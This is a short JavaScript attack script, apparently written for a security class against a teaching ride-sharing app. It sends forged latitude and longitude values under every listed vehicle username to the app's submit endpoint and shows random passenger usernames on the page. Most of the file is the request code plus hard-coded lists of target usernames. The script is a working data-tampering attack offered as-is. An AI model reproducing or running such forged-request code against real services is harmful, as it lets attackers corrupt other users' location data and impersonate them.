/*
 * Sends forged lat and lng to compromize users' data
 */
function hack_ming(){

	for (i = 0; i < vehicles.length; i++){
		send_req(vehicles[i]);
	}

	for (i = 0; i < 4; i++){
		randnr = Math.floor((Math.random() * 83));
		document.getElementById('hacked').innerHTML += "<p>" + passengers[randnr] + "</p>";
		//send_req(passengers[randnr]);
	}
}

/*
 * Compromises all vehicles' data and a random list of 4 passengers' data.
 */
function send_req(username){
	request = new XMLHttpRequest();
    request.open("POST", "http://defense-in-derpth.herokuapp.com/submit", true);
    request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    request.onreadystatechange = function() {
            if (request.readyState == 3 && request.status == 200){
                var response = request.responseText;
                var responseObject = JSON.parse(response);
            }
    };
   	var params = "username=" + username + "&lat=13&lng=13";
    request.send(params);
}

vehicles = ["JANET", "aSOqNo4S", "cQRzspF5", "itShXf78", "w8XMS577", "wtDRzig8", "ym2J1vil", "4aTtB30R", "1fH5MXna"];


passengers = 
["iraQrjcj",
"DhBOY0lT",
"LQBzR5Lc",
"GfxthVGV",
"ZkLnG6EZ",
"zVAzdXwT",
"QopbHhwB",
"aj5P8OGT",
"5xU0fpdZ",
"1ZTX8P2C",
"Qh1AMT8E",
"2zBf5CnB",
"zvLmuEPN",
"q37CTsZa",
"eKAxYriw",
"h6HzyiHK",
"We1HUtFX",
"vdOttDOL",
"dJys58Ox",
"Rhefuvfg",
"o5b341rr",
"52iVwuEg",
"QxCsBRo4",
"ZRNOMH3d",
"e0BdmYPs",
"vJ8HkH3e",
"DifF0fA9",
"QjvG1B5x",
"BGTOqZVx",
"85sBoDu6",
"7bBskisO",
"nmwMbHID",
"u48FRAF7",
"ohMT3Ekt",
"Yy7CwrO4",
"vXeUlZrk",
"TMMAmR9y",
"KFhBSaqv",
"aqGecNYE",
"YdpGqvtk",
"QymWuv6O",
"tkaebPFC",
"TRAM96zq",
"sSPuQLul",
"JyggLRkg",
"ZDp9SUI8",
"lTAv59dF",
"QF4y7nso",
"EHT0Rc9k",
"p9DXn1Nr",
"G8Gyp9DB",
"6NVPzKEi",
"OAyVNkd2",
"6VCxlrtD",
"OGyGLT4c",
"IR5n7nOy",
"STgg85uu",
"eOhwZ42u",
"6vZ9qT63",
"jelyI6fv",
"bG3XpClP",
"toA5vnc1",
"y7p5Fosa",
"QnjcxLkp",
"Xgzbl3n7",
"GOCK80Ii",
"bCaq0utn",
"zhlDIUUC",
"FACZaAp2",
"8jBoB4RN",
"s4lIFLCg",
"Km0TjyQB",
"H2I2KaRj",
"9SO147Xl",
"NJ9WQCEm",
"tNdlJuB4",
"mwFQ4Mfn",
"3fUAMsR2",
"yzuB0ru8",
"7Qro8170",
"Pfy0zQBn",
"hW9U2YVS",
"i3oxTCVc",
"GRFQKAVp"]